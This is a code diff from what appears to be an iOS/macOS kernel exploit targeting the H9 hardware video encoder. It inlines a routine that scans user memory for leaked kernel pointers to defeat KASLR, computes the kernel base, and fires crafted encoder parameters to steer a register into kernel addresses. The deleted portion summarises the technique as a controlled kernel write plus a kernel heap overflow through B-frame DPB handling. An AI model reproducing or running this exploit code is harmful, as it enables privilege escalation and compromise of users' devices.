@@ -82,8 +82,64 @@ static void H9EncodeCallback(void *refCon, void *src, OSStatus status,
     // Phase 2: B-frame DPB overflow (from ipsw-diffs)
     [self phase2_bframe_dpb];
 
-    // Phase 3: NTL + KASLR targeting
-    [self phase3_ntl_kaslr];
+    // Phase 3: NTL + KASLR targeting (inlined)
+    H9Log(@"");
+    H9Log(@"--- Phase 3: NTL + KASLR targeting ---");
+    H9Log(@"  Scanning user-space RW regions for kernel pointers...");
+
+    NSMutableArray *kptrs = [NSMutableArray array];
+    vm_address_t scanAddr = 0;
+    vm_size_t scanSize = 0;
+    vm_region_basic_info_data_64_t scanInfo;
+    mach_msg_type_number_t scanCount = VM_REGION_BASIC_INFO_COUNT_64;
+    mach_port_t scanObj = 0;
+
+    while (vm_region(mach_task_self(), &scanAddr, &scanSize, VM_REGION_BASIC_INFO_64,
+                     (vm_region_info_t)&scanInfo, &scanCount, &scanObj) == KERN_SUCCESS) {
+        if ((scanInfo.protection & VM_PROT_READ) && (scanInfo.protection & VM_PROT_WRITE)) {
+            uint64_t *p = (uint64_t *)scanAddr;
+            size_t words = scanSize / 8;
+            for (size_t i = 0; i < words && i < 4096; i++) {
+                uint64_t v = *(p + i);
+                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
+                    [kptrs addObject:@(v)];
+                }
+            }
+        }
+        scanAddr += scanSize;
+        scanCount = VM_REGION_BASIC_INFO_COUNT_64;
+    }
+
+    H9Log(@"  Kernel pointers found: %lu", (unsigned long)kptrs.count);
+
+    if (kptrs.count > 0) {
+        uint64_t textBase = 0xfffffff007004000ULL;
+        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
+        for (NSNumber *kp in kptrs) {
+            uint64_t v = kp.unsignedLongLongValue;
+            uint64_t aligned = v & ~0x3FFFULL;
+            if (aligned >= textBase) {
+                uint64_t slide = aligned - textBase;
+                NSString *key = [NSString stringWithFormat:@"0x%llx", slide];
+                slides[key] = @([slides[key] intValue] + 1);
+            }
+        }
+        NSString *bestSlide = nil;
+        int bestHits = 0;
+        for (NSString *s in slides) {
+            int hits = [slides[s] intValue];
+            if (hits > bestHits) { bestHits = hits; bestSlide = s; }
+        }
+        if (bestSlide) {
+            uint64_t slideVal = strtoull(bestSlide.UTF8String, NULL, 16);
+            H9Log(@"  KASLR slide = %@ (hits=%d)", bestSlide, bestHits);
+            H9Log(@"  Kernel base = 0x%llx", textBase + slideVal);
+            H9Log(@"  Firing NTL=1 (steers x0 into kernel range)...");
+            [self ntl_encode:1 width:640 height:480];
+            H9Log(@"  Firing NTL=16447 (steers x0 to 0xfffffff000000059)...");
+            [self ntl_encode:16447 width:640 height:480];
+        }
+    }
 
     H9Log(@"");
     H9Log(@"=== H9 COMPLETE ===");
@@ -274,87 +330,6 @@ static void H9EncodeCallback(void *refCon, void *src, OSStatus status,
 }
 
 #pragma mark - Phase 3: NTL + KASLR targeting
-
-- (void)phase3_ntl_kaslr {
-    H9Log(@"");
-    H9Log(@"--- Phase 3: NTL + KASLR targeting ---");
-
-    // Scan for kernel pointers to compute slide
-    H9Log(@"  Scanning user-space RW regions for kernel pointers...");
-
-    NSMutableArray *kptrs = [NSMutableArray array];
-    vm_address_t addr = 0;
-    vm_size_t size = 0;
-    vm_region_basic_info_data_64_t info;
-    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
-    mach_port_t object_name = 0;
-
-    while (vm_region(mach_task_self(), &addr, &size, VM_REGION_BASIC_INFO_64,
-                     (vm_region_info_t)&info, &count, &object_name) == KERN_SUCCESS) {
-        if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE)) {
-            uint64_t *p = (uint64_t *)addr;
-            size_t words = size / 8;
-            for (size_t i = 0; i < words && i < 4096; i++) {
-                uint64_t v = *(p + i);
-                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
-                    [kptrs addObject:@(v)];
-                }
-            }
-        }
-        addr += size;
-        count = VM_REGION_BASIC_INFO_COUNT_64;
-    }
-
-    H9Log(@"  Kernel pointers found: %lu", (unsigned long)kptrs.count);
-
-    if (kptrs.count > 0) {
-        // Compute slide from __TEXT segment base
-        uint64_t textBase = 0xfffffff007004000ULL;
-        NSMutableDictionary *slides = [NSMutableDictionary dictionary];
-        for (NSNumber *kp in kptrs) {
-            uint64_t v = kp.unsignedLongLongValue;
-            // Align to 0x4000 (segment alignment)
-            uint64_t aligned = v & ~0x3FFFULL;
-            if (aligned >= textBase) {
-                uint64_t slide = aligned - textBase;
-                NSString *key = [NSString stringWithFormat:@"0x%llx", slide];
-                slides[key] = @([slides[key] intValue] + 1);
-            }
-        }
-
-        // Find most frequent slide
-        NSString *bestSlide = nil;
-        int bestHits = 0;
-        for (NSString *s in slides) {
-            int hits = [slides[s] intValue];
-            if (hits > bestHits) { bestHits = hits; bestSlide = s; }
-        }
-
-        if (bestSlide) {
-            uint64_t slideVal = strtoull(bestSlide.UTF8String, NULL, 16);
-            H9Log(@"  KASLR slide = %@ (hits=%d)", bestSlide, bestHits);
-            H9Log(@"  Kernel base = 0x%llx", textBase + slideVal);
-
-            // Now fire NTL with pointer steering into kernel range
-            H9Log(@"");
-            H9Log(@"  Firing NTL=1 (steers x0 into kernel range)...");
-            [self ntl_encode:1 width:640 height:480];
-
-            H9Log(@"  Firing NTL=16447 (steers x0 to 0xfffffff000000059)...");
-            [self ntl_encode:16447 width:640 height:480];
-        }
-    }
-
-    // Summary
-    H9Log(@"");
-    H9Log(@"--- Summary ---");
-    H9Log(@"NTL trigger: controlled kernel write via pointer steering");
-    H9Log(@"  x0 = ((NTL-16463) << 32) | 0x59");
-    H9Log(@"  NTL=1 -> 0xfffffff000000059 (kernel range, silent write)");
-    H9Log(@"  Stores at +0, +8, +0x10 (x0) and 0 at +0x18");
-    H9Log(@"B-frame DPB: kernel heap overflow via saMBStats[m]");
-    H9Log(@"  B-frames -> DPB >= 3 -> writes past single sMBStats struct");
-}
 
 - (NSString *)runReport {
     @synchronized(g_h9_lock) {
